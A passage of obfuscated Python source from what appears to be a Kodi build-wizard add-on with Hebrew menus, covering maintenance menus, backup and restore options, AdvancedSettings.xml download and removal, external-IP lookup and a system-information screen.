		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOOOO00OOOOOO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3195
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O000000O0000OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3196
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0O000O0O0O00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3197
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3198
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3199
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3200
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3201
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3202
	if view =="addon"or SHOWMAINT =='false':#line:3203
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3204
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3205
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3206
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3207
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3208
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3209
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3210
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3211
	if view =="misc"or SHOWMAINT =='true':#line:3212
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3215
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3216
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3217
		addFile ('View Errors in Log: %s'%(O000O000OO000OOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3218
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addFile ('Clear Wizard Log File%s'%O0OOOO00O0O00O0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3221
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3222
	if view =="backup"or SHOWMAINT =='true':#line:3223
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3224
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3225
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3226
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3227
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3228
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3229
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3235
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3236
	if view =="tweaks"or SHOWMAINT =='true':#line:3237
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3238
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		else :#line:3240
			if os .path .exists (ADVANCED ):#line:3241
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3242
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3243
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3244
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3249
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3250
	addFile ('Show All Maintenance: %s'%O00O0000O0OO00OO0 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3251
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3252
	addFile ('Third Party Wizards: %s'%OOO0O0O0OO0O0OO00 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3253
	if OOO0O0O0OO0O0OO00 =='true':#line:3254
		O0O0O0OO0O0OO0O00 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3255
		O00O00OO0OOOOOO0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3256
		O000OOO0O0000000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3257
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0O0OO0O0OO0O00 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3258
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O00OO0OOOOOO0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3259
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OOO0O0000000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3260
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3261
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO000OOO0OO000OO .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3262
	if OOO000OOO0OO000OO =='true':#line:3263
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO0000O0O00OO00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3264
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0O0O00OO00O0O00 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3265
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O00O0OO000OOOO0O0 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3266
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00O0O000O000O000 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3267
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3268
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOOO0O0O0O0O0OO .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3269
	if OOOOOO0O0O0O0O0OO =='true':#line:3270
		addFile ('--- Include All Video Addons: %s'%O0O0000O0OO00O0OO .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3271
		addFile ('--- Include Bob: %s'%OO0O000OOO00OOO0O .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3272
		addFile ('--- Include Phoenix: %s'%OOOOO0O0000000000 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3273
		addFile ('--- Include Specto: %s'%OO0O0O0O0OOOOOO00 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3274
		addFile ('--- Include Exodus: %s'%O0O000O00OO0000OO .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3275
		addFile ('--- Include Salts: %s'%O0000O00OO000OOOO .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3276
		addFile ('--- Include Salts HD Lite: %s'%O0OO0OOO00OO0OOO0 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3277
		addFile ('--- Include One Channel: %s'%OOO0O00000O0O0OO0 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3278
		addFile ('--- Include Genesis: %s'%OO0O00O000OO0OO00 .replace ('true',OOOOOO0O0OOOOO0OO ).replace ('false',O0000O00O0OOO00O0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3281
	setView ('files','viewType')#line:3282
def advancedWindow (url =None ):#line:3284
	if not ADVANCEDFILE =='http://':#line:3285
		if url ==None :#line:3286
			O0OOOO000OO0OO0OO =wiz .workingURL (ADVANCEDFILE )#line:3287
			OOOO000O000OOOOO0 =uservar .ADVANCEDFILE #line:3288
		else :#line:3289
			O0OOOO000OO0OO0OO =wiz .workingURL (url )#line:3290
			OOOO000O000OOOOO0 =url #line:3291
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		if os .path .exists (ADVANCED ):#line:3293
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3294
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3295
		if O0OOOO000OO0OO0OO ==True :#line:3296
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3297
			O0OOO0OOO0O000O00 =wiz .openURL (OOOO000O000OOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3298
			O0O0O0000O0O00O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OOO0OOO0O000O00 )#line:3299
			if len (O0O0O0000O0O00O00 )>0 :#line:3300
				for O0O0OO000OO0OOO0O ,O0OOOO00O0000O00O ,url ,O00OOOOOOOOOO000O ,OO0OO0O0O00O0O00O ,O0OO0OO000OOO0OO0 in O0O0O0000O0O00O00 :#line:3301
					if O0OOOO00O0000O00O .lower ()=="yes":#line:3302
						addDir ("[B]%s[/B]"%O0O0OO000OO0OOO0O ,'advancedsetting',url ,description =O0OO0OO000OOO0OO0 ,icon =O00OOOOOOOOOO000O ,fanart =OO0OO0O0O00O0O00O ,themeit =THEME3 )#line:3303
					else :#line:3304
						addFile (O0O0OO000OO0OOO0O ,'writeadvanced',O0O0OO000OO0OOO0O ,url ,description =O0OO0OO000OOO0OO0 ,icon =O00OOOOOOOOOO000O ,fanart =OO0OO0O0O00O0O00O ,themeit =THEME2 )#line:3305
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3306
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOOO000OO0OO0OO )#line:3307
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3308
def writeAdvanced (OO00OO00000OOOO00 ,O00O00OOOO00OOO00 ):#line:3310
	O00OOOOO0000O0O0O =wiz .workingURL (O00O00OOOO00OOO00 )#line:3311
	if O00OOOOO0000O0O0O ==True :#line:3312
		if os .path .exists (ADVANCED ):O000O0OOOO00O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OO00000OOOO00 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3313
		else :O000O0OOOO00O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OO00000OOOO00 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3314
		if O000O0OOOO00O000O ==1 :#line:3316
			O0O0O0OOOOOOO00OO =wiz .openURL (O00O00OOOO00OOO00 )#line:3317
			OOOO0O000OOOOOO0O =open (ADVANCED ,'w');#line:3318
			OOOO0O000OOOOOO0O .write (O0O0O0OOOOOOO00OO )#line:3319
			OOOO0O000OOOOOO0O .close ()#line:3320
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3321
			wiz .killxbmc (True )#line:3322
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3323
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OOOOO0000O0O0O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3324
def viewAdvanced ():#line:3326
	OO0000O00000OO00O =open (ADVANCED )#line:3327
	O0000O0000OOOOO0O =OO0000O00000OO00O .read ().replace ('\t','    ')#line:3328
	wiz .TextBox (ADDONTITLE ,O0000O0000OOOOO0O )#line:3329
	OO0000O00000OO00O .close ()#line:3330
def removeAdvanced ():#line:3332
	if os .path .exists (ADVANCED ):#line:3333
		wiz .removeFile (ADVANCED )#line:3334
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3335
def showAutoAdvanced ():#line:3337
	notify .autoConfig ()#line:3338
def getIP ():#line:3340
	OOO0O0OOOO0OO0OOO ='http://whatismyipaddress.com/'#line:3341
	if not wiz .workingURL (OOO0O0OOOO0OO0OOO ):return 'Unknown','Unknown','Unknown'#line:3342
	O0OO00OOOO00OO0OO =wiz .openURL (OOO0O0OOOO0OO0OOO ).replace ('\n','').replace ('\r','')#line:3343
	if not 'Access Denied'in O0OO00OOOO00OO0OO :#line:3344
		OO0OO0OO000O000O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0OO00OOOO00OO0OO )#line:3345
		O00O0O00O00OO0O0O =OO0OO0OO000O000O0 [0 ]if (len (OO0OO0OO000O000O0 )>0 )else 'Unknown'#line:3346
		O0O0O0O000000O0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0OO00OOOO00OO0OO )#line:3347
		OO000OO0OOO0O0OOO =O0O0O0O000000O0OO [0 ]if (len (O0O0O0O000000O0OO )>0 )else 'Unknown'#line:3348
		OO0O0OO000O00O000 =O0O0O0O000000O0OO [1 ]+', '+O0O0O0O000000O0OO [2 ]+', '+O0O0O0O000000O0OO [3 ]if (len (O0O0O0O000000O0OO )>2 )else 'Unknown'#line:3349
		return O00O0O00O00OO0O0O ,OO000OO0OOO0O0OOO ,OO0O0OO000O00O000 #line:3350
	else :return 'Unknown','Unknown','Unknown'#line:3351
def systemInfo ():#line:3353
	O00000O0O000OO000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3367
	OOOOOOOOO00OO0OOO =[];OO000OO0O00000O00 =0 #line:3368
	for O0OOOO00OOOO00OOO in O00000O0O000OO000 :#line:3369
		OOO0OO00OOOO00000 =wiz .getInfo (O0OOOO00OOOO00OOO )#line:3370
		OO0OOO0O0OOOOOOOO =0 #line:3371
		while OOO0OO00OOOO00000 =="Busy"and OO0OOO0O0OOOOOOOO <10 :#line:3372
			OOO0OO00OOOO00000 =wiz .getInfo (O0OOOO00OOOO00OOO );OO0OOO0O0OOOOOOOO +=1 ;wiz .log ("%s sleep %s"%(O0OOOO00OOOO00OOO ,str (OO0OOO0O0OOOOOOOO )));xbmc .sleep (1000 )#line:3373
		OOOOOOOOO00OO0OOO .append (OOO0OO00OOOO00000 )#line:3374
		OO000OO0O00000O00 +=1 #line:3375
	O00OOO00OO00000O0 =OOOOOOOOO00OO0OOO [8 ]if 'Una'in OOOOOOOOO00OO0OOO [8 ]else wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [8 ][:-8 ]))*1024 *1024 )#line:3376
	O0OOOO00OOOO00OO0 =OOOOOOOOO00OO0OOO [9 ]if 'Una'in OOOOOOOOO00OO0OOO [9 ]else wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [9 ][:-8 ]))*1024 *1024 )#line:3377
	OO0OOO0OOO000O0O0 =OOOOOOOOO00OO0OOO [10 ]if 'Una'in OOOOOOOOO00OO0OOO [10 ]else wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [10 ][:-8 ]))*1024 *1024 )#line:3378
	O00OO0OOO0OO00000 =wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [11 ][:-2 ]))*1024 *1024 )#line:3379
	O000000OOOO0OOOO0 =wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [12 ][:-2 ]))*1024 *1024 )#line:3380
	O0000O0OO000OOOO0 =wiz .convertSize (int (float (OOOOOOOOO00OO0OOO [13 ][:-2 ]))*1024 *1024 )#line:3381
	O00O0OO0O00OOOO0O ,O0OOO00OO0000OO00 ,O0OOO0O00OO00000O =getIP ()#line:3382
	O0OOOOO0O0O000O00 =[];OO0O0O0O0O000OOOO =[];O000000O0000000O0 =[];O0OOO0O0OO000O000 =[];O0O0OO0O00O0000O0 =[];OOOO0O0O00O000OOO =[];O00OO0O0O000OO0OO =[]#line:3384
	OO0OO000O0O00O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3386
	for O0O000000O00O0O00 in sorted (OO0OO000O0O00O00O ,key =lambda O00O0OO0O0OOOOO00 :O00O0OO0O0OOOOO00 ):#line:3387
		O00000OO00OOO00O0 =os .path .split (O0O000000O00O0O00 [:-1 ])[1 ]#line:3388
		if O00000OO00OOO00O0 =='packages':continue #line:3389
		OO0O0000O0OOOO000 =os .path .join (O0O000000O00O0O00 ,'addon.xml')#line:3390
		if os .path .exists (OO0O0000O0OOOO000 ):#line:3391
			OO0OO0O0O00000O0O =open (OO0O0000O0OOOO000 )#line:3392
			OO00O0O0OO000000O =OO0OO0O0O00000O0O .read ()#line:3393
			OO000O0000OO0O00O =re .compile ("<provides>(.+?)</provides>").findall (OO00O0O0OO000000O )#line:3394
			if len (OO000O0000OO0O00O )==0 :#line:3395
				if O00000OO00OOO00O0 .startswith ('skin'):O00OO0O0O000OO0OO .append (O00000OO00OOO00O0 )#line:3396
				if O00000OO00OOO00O0 .startswith ('repo'):O0O0OO0O00O0000O0 .append (O00000OO00OOO00O0 )#line:3397
				else :OOOO0O0O00O000OOO .append (O00000OO00OOO00O0 )#line:3398
			elif not (OO000O0000OO0O00O [0 ]).find ('executable')==-1 :O0OOO0O0OO000O000 .append (O00000OO00OOO00O0 )#line:3399
			elif not (OO000O0000OO0O00O [0 ]).find ('video')==-1 :O000000O0000000O0 .append (O00000OO00OOO00O0 )#line:3400
			elif not (OO000O0000OO0O00O [0 ]).find ('audio')==-1 :OO0O0O0O0O000OOOO .append (O00000OO00OOO00O0 )#line:3401
			elif not (OO000O0000OO0O00O [0 ]).find ('image')==-1 :O0OOOOO0O0O000O00 .append (O00000OO00OOO00O0 )#line:3402
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3404
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3405
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3406
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3407
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3408
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3409
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3411
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3412
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3413
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3415
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO00OO00000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3416
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00OOOO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3417
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0OOO000O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3418
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3420
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0OOO0OO00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3421
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OOOO0OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3422
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OO000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3423
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3425
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3426
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO0O00OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3427
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO0000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3428
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00OO00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3429
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00OO0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3430
	O0O000O0OO00O000O =len (O0OOOOO0O0O000O00 )+len (OO0O0O0O0O000OOOO )+len (O000000O0000000O0 )+len (O0OOO0O0OO000O000 )+len (OOOO0O0O00O000OOO )+len (O00OO0O0O000OO0OO )+len (O0O0OO0O00O0000O0 )#line:3432
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O000O0OO00O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3433
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000000O0000000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0O0OO000O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0O0O0O000OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0O0O000O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0O00O0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3438
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO0O0O000OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0O0O00O000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3440
def Menu ():#line:3441
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3442
def saveMenu ():#line:3444
	OO0O0O0O00OO0000O ='[COLOR yellow]מופעל[/COLOR]';OO0O000O0OO000000 ='[COLOR blue]מבוטל[/COLOR]'#line:3446
	O0OO000OO0O00O0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3447
	O0O0000OOOOO0OO00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3448
	O0O0000OOO0OOOOOO ='true'if KEEPINFO =='true'else 'false'#line:3449
